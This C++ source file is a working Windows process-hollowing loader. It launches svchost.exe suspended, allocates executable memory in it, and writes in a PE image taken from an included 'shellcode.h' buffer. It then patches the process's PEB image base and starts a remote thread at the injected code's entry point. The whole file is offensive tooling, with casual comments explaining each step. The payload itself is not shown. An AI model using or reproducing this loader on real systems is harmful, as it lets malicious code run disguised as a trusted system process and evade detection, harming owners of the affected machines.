#include <iostream>
#include <Windows.h>
#include <strsafe.h>

#include "hdr/shellcode.h"

int main() {
    // pointers to important structs
    PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)rawData;
    PIMAGE_NT_HEADERS64 NtHeader = (PIMAGE_NT_HEADERS64)(rawData + DosHeader->e_lfanew);

    // process info lets you get useful stuff like the process handle with 0 issues
    PROCESS_INFORMATION pi;
    STARTUPINFO si = { sizeof(si) };

    ULONG_PTR retlen;
    PROCESS_BASIC_INFORMATION pbi;
    void* newImgBase;
    DWORD64 ImgBaseAddress;

    // load ntdll to call NtQueryInformationProcess (better than adding it as a dependency for multiple reasons)
    HMODULE ntDll = LoadLibraryA("ntdll.dll");
    NTQUERYINFOPROC64 NtQueryInformationProcess = (NTQUERYINFOPROC64)GetProcAddress(ntDll, "NtQueryInformationProcess");

    // check sig
    if (NtHeader->Signature != IMAGE_NT_SIGNATURE) {
        return 1;
    }

    // create svchost (or any other process) in a suspended state using the CREATE_SUSPENDED flag
    // startup info and process info are passed in
    if (!CreateProcess("C:\\Windows\\System32\\svchost.exe",
        NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED, // le flag
        NULL, NULL, &si, &pi)) { // Pass the address of pi, not a pointer to it
        std::cerr << "CreateProcess failed: " << GetLastError() << std::endl;
        return 1;
    }

    // find PBI (process basic info)
    NtQueryInformationProcess(
        pi.hProcess,
        ProcessBasicInformation,
        &pbi,
        sizeof(PROCESS_BASIC_INFORMATION),
        &retlen
    );

    // allocate memory for the new image base
    newImgBase = VirtualAllocEx(
        pi.hProcess,
        NULL,
        NtHeader->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (newImgBase == NULL) {
        // Handle the error, print a message, and exit gracefully.
        std::cerr << "VirtualAllocEx failed: " << GetLastError() << std::endl;
        return 1;
    }

    // write headers
    WriteProcessMemory(pi.hProcess, newImgBase, rawData, NtHeader->OptionalHeader.SizeOfHeaders, 0);

    // rewrite sections
    PIMAGE_SECTION_HEADER SectionHeader = (PIMAGE_SECTION_HEADER)(rawData + DosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS64));

    for (int num = 0; num < NtHeader->FileHeader.NumberOfSections; num++) {
        if (!WriteProcessMemory(pi.hProcess,
            (LPVOID)((DWORD64)newImgBase + SectionHeader->VirtualAddress),
            (LPVOID)((DWORD64)rawData + SectionHeader->PointerToRawData),
            SectionHeader->SizeOfRawData,
            0)) {
            std::cerr << "Failed to write section: " << GetLastError() << std::endl;
        }
        SectionHeader++;
    }

    // 0x10 is the offset for img base address
    ImgBaseAddress = (DWORD64)pbi.PebBaseAddress + 0x10;
    if (!WriteProcessMemory(pi.hProcess, (LPVOID)ImgBaseAddress, &newImgBase, sizeof(newImgBase), 0)) {
        std::cerr << "Failed to write ImgBaseAddress: " << GetLastError() << std::endl;
    }

    // create a new suspended thread
    HANDLE NewThread = CreateRemoteThread(pi.hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)((DWORD64)newImgBase + NtHeader->OptionalHeader.AddressOfEntryPoint),
        NULL,
        CREATE_SUSPENDED,
        NULL);

    // resume the thread we created
    ResumeThread(NewThread);

    // suspend the original thread
    SuspendThread(pi.hThread);

    // free the ntDll library as it's no longer needed but we're exiting anyway
    FreeLibrary(ntDll);
    return 0;
}